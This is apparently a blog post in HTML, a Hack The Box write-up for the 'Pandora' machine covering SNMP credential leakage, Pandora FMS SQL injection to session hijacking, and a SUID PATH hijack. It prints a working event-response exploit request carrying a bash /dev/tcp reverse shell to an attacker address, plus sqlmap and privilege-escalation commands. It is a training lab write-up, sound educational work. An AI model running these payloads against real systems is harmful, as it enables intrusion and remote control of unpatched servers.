@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HTB: Pandora | Chaelsoo&#39;s blog</title>
+<meta property="og:title" content="HTB: Pandora | Chaelsoo&#39;s blog" />
+<meta name="twitter:title" content="HTB: Pandora | Chaelsoo&#39;s blog" />
+<meta itemprop="name" content="HTB: Pandora | Chaelsoo&#39;s blog" />
+<meta name="application-name" content="HTB: Pandora | Chaelsoo&#39;s blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="An Easy Linux box where SNMP with the default community string leaks SSH creds from process arguments. An unauthenticated SQLi on Pandora FMS hijacks a session for RCE, and a SUID PATH hijack closes it.">
+<meta itemprop="description" content="An Easy Linux box where SNMP with the default community string leaks SSH creds from process arguments. An unauthenticated SQLi on Pandora FMS hijacks a session for RCE, and a SUID PATH hijack closes it." />
+<meta property="og:description" content="An Easy Linux box where SNMP with the default community string leaks SSH creds from process arguments. An unauthenticated SQLi on Pandora FMS hijacks a session for RCE, and a SUID PATH hijack closes it." />
+<meta name="twitter:description" content="An Easy Linux box where SNMP with the default community string leaks SSH creds from process arguments. An unauthenticated SQLi on Pandora FMS hijacks a session for RCE, and a SUID PATH hijack closes it." />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/htb-pandora/" title="English" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.161.1">
+
+    
+    <meta property="og:url" content="http://localhost:1313/writeups/htb-pandora/">
+  <meta property="og:site_name" content="Chaelsoo&#39;s blog">
+  <meta property="og:title" content="HTB: Pandora">
+  <meta property="og:description" content="An Easy Linux box where SNMP with the default community string leaks SSH creds from process arguments. An unauthenticated SQLi on Pandora FMS hijacks a session for RCE, and a SUID PATH hijack closes it.">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-06-03T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-03T00:00:00+00:00">
+    <meta property="article:tag" content="Path-Hijack">
+    <meta property="article:tag" content="Sqli">
+    <meta property="article:tag" content="Cve-Exploit">
+    <meta property="article:tag" content="Tty">
+    <meta property="article:tag" content="Linux">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: Pandora">
+  <meta name="twitter:description" content="An Easy Linux box where SNMP with the default community string leaks SSH creds from process arguments. An unauthenticated SQLi on Pandora FMS hijacks a session for RCE, and a SUID PATH hijack closes it.">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/writeups/htb-pandora/">
+    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blogs/">
+                        Blogs
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/writeups/">
+                        Writeups
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="https://notes.chaelsoo.me">
+                        Cheatsheet
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HTB: Pandora</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-06-03T00:00:00&#43;00:00" itemprop="datePublished"> 3 Jun 2026 </time>
+                </div>
+                
+            </header>
+            
+            <img src="/images/writeups/htb-pandora/htb-pandora-pwned.png" alt="HTB: Pandora" style="width:100%;border-radius:0.5rem;margin:1.5rem 0;" />
+            
+            <div class="toc-container">
+    <button class="toc-toggle" type="button" onclick="toggleToc()">Table of Contents</button>
+    <div class="toc-content" id="tocContent">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon-tcp-said-nothing-udp-said-everything">Recon: TCP Said Nothing, UDP Said Everything</a></li>
+    <li><a href="#snmp-enumeration-credentials-in-process-arguments">SNMP Enumeration: Credentials in Process Arguments</a></li>
+    <li><a href="#pandora-fms-finding-the-internal-console">Pandora FMS: Finding the Internal Console</a></li>
+    <li><a href="#cve-2021-32099-sqli-to-session-hijacking">CVE-2021-32099: SQLi to Session Hijacking</a></li>
+    <li><a href="#cve-2020-13851-authenticated-rce-via-event-response">CVE-2020-13851: Authenticated RCE via Event Response</a></li>
+    <li><a href="#privilege-escalation-why-path-hijack-needs-ssh">Privilege Escalation: Why PATH Hijack Needs SSH</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+<div class="mini-toc" id="miniToc">
+    <div class="mini-toc-header">
+        <div class="mini-toc-title">Contents</div>
+        <button class="mini-toc-minimize" type="button" onclick="toggleMiniToc()" aria-label="Minimize TOC">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
+            </svg>
+        </button>
+    </div>
+    <div class="mini-toc-content" id="miniTocContent"></div>
+</div>
+            <div class="page-content">
+                <p>Linux Easy. The TCP scan gives you almost nothing: SSH on 22 and a static company landing page on 80. The UDP scan is where things get interesting. SNMP is running with the default &ldquo;public&rdquo; community string, and the process argument table has <code>host_check</code> running with credentials directly in its parameters. That&rsquo;s your SSH login.</p>
+<p>Once inside as <code>daniel</code>, you&rsquo;re not the user that holds the flag. A second user, <code>matt</code>, owns the Pandora FMS monitoring console that&rsquo;s locked behind a localhost-only virtual host. Getting into that console doesn&rsquo;t require a valid password: an unauthenticated SQLi lets you dump active PHP sessions and just cookie yourself in as matt. From there, an authenticated RCE via event response drops a reverse shell.</p>
+<p>The SUID privilege escalation was the most instructive part. The PATH hijack approach is obvious the moment you run the binary. What wasn&rsquo;t obvious is why it fails from a reverse shell but works from an SSH session. Understanding that gap meant learning what <code>PR_SET_NO_NEW_PRIVS</code> is and what Apache does to its child processes.</p>
+<h2 id="recon-tcp-said-nothing-udp-said-everything">Recon: TCP Said Nothing, UDP Said Everything</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41
+</span></span></code></pre></div><p>Two ports. The web server just hosts a static landing page. Nothing injectable, nothing sensitive. That&rsquo;s when UDP scan pays for itself:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sV -sU -T4 <span class="nv">$DC_IP</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">161/udp  open  snmp  SNMPv1 server; net-snmp SNMPv3 server (public)
+</span></span></code></pre></div><p>SNMP on 161 with the community string <code>public</code>. That&rsquo;s the default, and it&rsquo;s still open.</p>
+<h2 id="snmp-enumeration-credentials-in-process-arguments">SNMP Enumeration: Credentials in Process Arguments</h2>
+<p>SNMP (Simple Network Management Protocol) is used by network administrators to remotely monitor and configure devices: servers, switches, routers. It exposes a tree of management information objects (MIBs) that describe everything about the system, from network interface configuration to running processes to installed software. The &ldquo;community string&rdquo; is SNMP&rsquo;s authentication mechanism, essentially a password that gates read (and sometimes write) access to that tree.</p>
+<p>The <code>public</code> community string means read access for anyone. And the process argument table (OID <code>1.3.6.1.2.1.25.4.2.1.5</code>) is one of the more valuable nodes: it lists the command-line parameters each running process was started with.</p>
+<p>Start with the process name list to find anything unusual:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">snmpwalk -v2c -c public 10.129.11.250 1.3.6.1.2.1.25.4.2.1.2
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">hrSWRunName.1117 = STRING: &#34;host_check&#34;
+</span></span></code></pre></div><p><code>host_check</code> is a custom binary. Grab its full parameter record with a bulk walk:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">snmpbulkwalk -v2c -c public 10.129.11.250 &gt; snmp.txt
+</span></span><span class="line"><span class="cl">grep -E <span class="s2">&#34;\.1117 =&#34;</span> snmp.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">hrSWRunPath.1117       = STRING: &#34;/usr/bin/host_check&#34;
+</span></span><span class="line"><span class="cl">hrSWRunParameters.1117 = STRING: &#34;-u daniel -p HotelBabylon23&#34;
+</span></span></code></pre></div><p><code>daniel:HotelBabylon23</code>. SSH in directly.</p>
+<p><em>Credentials in process arguments are more common than you&rsquo;d expect in real environments. Anything spawned with flags like <code>-p password</code> or <code>--token value</code> is visible to anyone who can read <code>/proc/&lt;pid&gt;/cmdline</code> or query SNMP. The fix is environment variables or config files with restricted permissions.</em></p>
+<h2 id="pandora-fms-finding-the-internal-console">Pandora FMS: Finding the Internal Console</h2>
+<p>Logged in as daniel. Two users in <code>/home</code>: daniel and matt. Matt owns the user flag.</p>
+<p>Checking listening services:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ss -tun lnp
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">tcp LISTEN 0 80  127.0.0.1:3306  0.0.0.0:*    # MySQL
+</span></span><span class="line"><span class="cl">tcp LISTEN 0 511          *:80         *:*    # Apache
+</span></span></code></pre></div><p>MySQL on localhost and Apache on all interfaces. The external port 80 just serves the static landing page. But Apache can serve different content to different interfaces using virtual hosts. The Pandora directory in <code>/var/www/</code> confirmed it:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ls -la /var/www/
+</span></span><span class="line"><span class="cl"><span class="c1"># drwxr-xr-x  3 root root html</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># drwxr-xr-x  3 matt matt pandora</span>
+</span></span></code></pre></div><p>The Pandora FMS console is in a directory owned by matt and almost certainly configured as a localhost-only virtual host. Forward it out with chisel:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># attacker</span>
+</span></span><span class="line"><span class="cl">chisel server -p <span class="m">8000</span> --reverse
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># target</span>
+</span></span><span class="line"><span class="cl">./chisel client 10.10.16.129:8000 R:8080:127.0.0.1:80
+</span></span></code></pre></div><p><img src="/images/writeups/htb-pandora/pandorafms-login-page.png" alt="Pandora FMS “Welcome to Pandora FMS Next Generation” login page"></p>
+<p>Version <code>v7.0NG.742_FIX_PERL2020</code> in the footer. The static credentials from the config files (<code>admin:pandora</code>, <code>pandora:pandora</code>) didn&rsquo;t work. They were clearly defaults that hadn&rsquo;t been applied here.</p>
+<h2 id="cve-2021-32099-sqli-to-session-hijacking">CVE-2021-32099: SQLi to Session Hijacking</h2>
+<p>Version 7.0NG.742 is vulnerable to an unauthenticated SQL injection in <code>chart_generator.php</code> via the <code>session_id</code> parameter. This file generates chart data and is accessible without authentication.</p>
+<p>SQL injection means the parameter value is being interpolated directly into a SQL query without sanitization. By terminating the expected value and appending your own SQL, you can alter what the query returns. A UNION-based injection lets you read from arbitrary tables.</p>
+<p>Confirming the injection:</p>
+<p><img src="/images/writeups/htb-pandora/sqli-error-confirmation.png" alt="SQL error message showing UNION-based injection is viable: “SELECT * FROM tsessions_php WHERE id_session = ‘a’ UNION SELECT 1, ‘id_usuario’ LIMIT 1” with “ACCESS IS NOT GRANTED”"></p>
+<p>The error message reveals the table name <code>tsessions_php</code> and the column structure. Hand the parameter to sqlmap:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -u <span class="s1">&#39;http://localhost:8080/pandora_console/include/chart_generator.php?session_id=1&#39;</span>
+</span></span></code></pre></div><p><img src="/images/writeups/htb-pandora/sqlmap-injection-confirmed.png" alt="sqlmap terminal output confirming the session_id parameter is injectable via UNION-based technique"></p>
+<p><img src="/images/writeups/htb-pandora/sqlmap-tables-dump.png" alt="sqlmap database dump showing the tsessions_php table schema and session records"></p>
+<p>The <code>tsessions_php</code> table stores active PHP sessions. PHP session authentication works by issuing a session token (stored in a cookie called <code>PHPSESSID</code>) that maps to a row in this table. If you can read the session token of an authenticated user, you can set that cookie in your browser and the application treats you as that user.</p>
+<p>Dumping the table returned dozens of daniel sessions and one matt session. Set <code>PHPSESSID</code> to matt&rsquo;s token in the browser:</p>
+<p><img src="/images/writeups/htb-pandora/pandorafms-dashboard-matt.png" alt="Pandora FMS dashboard showing logged in as matt (admin) with server health monitors and failed login attempts from matt in the activity log"></p>
+<p>The activity log shows matt&rsquo;s failed login attempts from trying the default credentials. The SQLi session hijack bypassed the login entirely. We&rsquo;re in as matt with admin access.</p>
+<h2 id="cve-2020-13851-authenticated-rce-via-event-response">CVE-2020-13851: Authenticated RCE via Event Response</h2>
+<p>Pandora FMS admin users can configure automatic responses to monitoring events. This feature accepts a command to execute when a specified event occurs. CVE-2020-13851 is the fact that this command runs on the server without sanitization, giving authenticated admin users OS command execution.</p>
+<p>The exploit sends a crafted POST to <code>ajax.php</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">POST /pandora_console/ajax.php HTTP/1.1
+</span></span><span class="line"><span class="cl">Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>&lt;matt_session_token&gt;
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">page</span><span class="o">=</span>include/ajax/events<span class="p">&amp;</span><span class="nv">perform_event_response</span><span class="o">=</span>10000000<span class="p">&amp;</span><span class="nv">target</span><span class="o">=</span>bash+-c+<span class="s2">&#34;bash+-i+&gt;%26+/dev/tcp/10.10.16.129/9999+0&gt;%261&#34;</span><span class="p">&amp;</span><span class="nv">response_id</span><span class="o">=</span><span class="m">1</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp <span class="m">9999</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Connection received on 10.129.11.250</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># matt@pandora:/var/www/pandora/pandora_console$</span>
+</span></span></code></pre></div><p>Reverse shell as matt. User flag in <code>/home/matt/user.txt</code>.</p>
+<h2 id="privilege-escalation-why-path-hijack-needs-ssh">Privilege Escalation: Why PATH Hijack Needs SSH</h2>
+<p>Looking for SUID binaries:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -perm -4000 -ls 2&gt;/dev/null
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">-rwsr-x---  1 root  matt  16816 Dec  3 2021 /usr/bin/pandora_backup
+</span></span></code></pre></div><p>This binary is owned by root, has the SUID bit set, and is executable by members of the <code>matt</code> group. When it runs, it executes with root&rsquo;s effective UID regardless of who invoked it. Running it:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/bin/pandora_backup
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">PandoraFMS Backup Utility
+</span></span><span class="line"><span class="cl">Now attempting to backup PandoraFMS client
+</span></span><span class="line"><span class="cl">tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
+</span></span><span class="line"><span class="cl">Backup failed!
+</span></span></code></pre></div><p>It calls <code>tar</code>. SUID binaries that call external commands without absolute paths are vulnerable to PATH hijacking: if you prepend a directory you control to <code>$PATH</code> and put a malicious file named <code>tar</code> there, the binary finds your file first and executes it with root&rsquo;s UID.</p>
+<p>I tried this from the reverse shell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;#!/bin/bash\nbash&#39;</span> &gt; /tmp/tar
+</span></span><span class="line"><span class="cl">chmod +x /tmp/tar
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+</span></span><span class="line"><span class="cl">/usr/bin/pandora_backup
+</span></span></code></pre></div><p>Nothing. The binary ran, <code>tar</code> was called, and I got back the permission denied error as if my fake tar wasn&rsquo;t there.</p>
+<p>Two things are working against you from a reverse shell spawned via Apache:</p>
+<p>First, there&rsquo;s no TTY. A reverse shell is just an I/O tunnel between two sockets. No terminal device is allocated. Some privilege-escalating operations require a real TTY because they interact with PAM or need to set the controlling terminal. Without one, they fail silently or differently than expected.</p>
+<p>Second, and more significant: Apache sets <code>PR_SET_NO_NEW_PRIVS</code> on itself and all processes it spawns. This is a Linux kernel feature (<code>prctl(PR_SET_NO_NEW_PRIVS, 1)</code>) that permanently disables privilege escalation for the calling process and all its descendants. Once set, no child process can gain elevated privileges through a SUID binary, <code>sudo</code>, or any other mechanism. The flag is inherited across <code>fork()</code> and <code>exec()</code>. A reverse shell spawned from Apache carries it automatically.</p>
+<p>This is why <code>sudo /usr/bin/pandora_backup</code> also fails:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
+</span></span><span class="line"><span class="cl">sudo: unable to initialize policy plugin
+</span></span></code></pre></div><p>sudo can&rsquo;t elevate because <code>PR_SET_NO_NEW_PRIVS</code> prevents <code>setresuid</code> from succeeding.</p>
+<p>The fix: get out of Apache&rsquo;s process tree. SSH spawns an entirely independent session with a real TTY and no inherited security restrictions.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINfM3f5pQSTpJZOocgjMtDRHxbD4Q1Tzby5gtlC1VMDr kanyo@gigabyte&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  &gt; /home/matt/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">chmod <span class="m">700</span> /home/matt/.ssh
+</span></span><span class="line"><span class="cl">chmod <span class="m">600</span> /home/matt/.ssh/authorized_keys
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -i pandora matt@10.129.11.250
+</span></span></code></pre></div><p>Now the PATH hijack works:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat &gt; /tmp/tar <span class="s">&lt;&lt; &#39;EOF&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="s">bash
+</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
+</span></span><span class="line"><span class="cl">chmod +x /tmp/tar
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/bin/pandora_backup
+</span></span><span class="line"><span class="cl"><span class="c1"># PandoraFMS Backup Utility</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Now attempting to backup PandoraFMS client</span>
+</span></span><span class="line"><span class="cl">root@pandora:/tmp# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>matt<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>matt<span class="o">)</span>
+</span></span></code></pre></div><p>Root. The SUID binary called <code>/tmp/tar</code> instead of <code>/usr/bin/tar</code>, that tar script ran bash, and because the binary was SUID root, bash inherited root&rsquo;s UID. Root flag in <code>/root/root.txt</code>. The PATH hijack is textbook but the SNMP entry is what I&rsquo;d take away from this one. You can sit there running nmap TCP scans all day and never see it. Always scan UDP before you declare a box has no surface area.</p>
+<p><em>Reference: <a href="https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities">CoreSecurity - Pandora FMS Community Multiple Vulnerabilities</a></em></p>
+
+            </div>
+        </article></main>
+</div>
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+        if (!content || !button) return;
+        content.classList.toggle('expanded');
+        button.classList.toggle('expanded');
+    }
+
+    function toggleMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        if (miniToc) miniToc.classList.toggle('minimized');
+    }
+
+    function setupActiveHighlighting(links) {
+        const targets = Array.from(links).map(link => {
+            const href = link.getAttribute('href');
+            if (href && href.startsWith('#')) {
+                const el = document.getElementById(decodeURIComponent(href.slice(1)));
+                if (el) return { link, element: el };
+            }
+            return null;
+        }).filter(Boolean);
+
+        if (targets.length === 0) return;
+
+        function update() {
+            const scrollPosition = window.scrollY + 100;
+            let active = null;
+            targets.forEach(t => {
+                if (t.element.offsetTop <= scrollPosition) active = t;
+            });
+            links.forEach(l => l.classList.remove('active'));
+            if (active) active.link.classList.add('active');
+        }
+
+        let ticking = false;
+        window.addEventListener('scroll', () => {
+            if (!ticking) {
+                requestAnimationFrame(() => { update(); ticking = false; });
+                ticking = true;
+            }
+        });
+        update();
+    }
+
+    function initMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        const miniTocContent = document.getElementById('miniTocContent');
+        const sourceToc = document.getElementById('tocContent');
+        if (!miniToc || !miniTocContent || !sourceToc) return;
+
+        const clone = sourceToc.cloneNode(true);
+        clone.classList.remove('toc-content', 'expanded');
+        clone.removeAttribute('id');
+
+        const links = clone.querySelectorAll('a');
+        if (links.length === 0) return;
+
+        links.forEach(link => {
+            link.addEventListener('click', (e) => {
+                const href = link.getAttribute('href');
+                if (href && href.startsWith('#')) {
+                    const target = document.getElementById(decodeURIComponent(href.slice(1)));
+                    if (target) {
+                        e.preventDefault();
+                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                        history.pushState(null, '', href);
+                    }
+                }
+            });
+        });
+
+        miniTocContent.appendChild(clone);
+        miniToc.classList.add('visible');
+        setupActiveHighlighting(links);
+    }
+
+    document.addEventListener('DOMContentLoaded', initMiniToc);
+</script>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://discord.com/users/kanyo._" target="_blank" rel="noopener noreferrer me"
+    title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
+    <path
+        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
+    <path
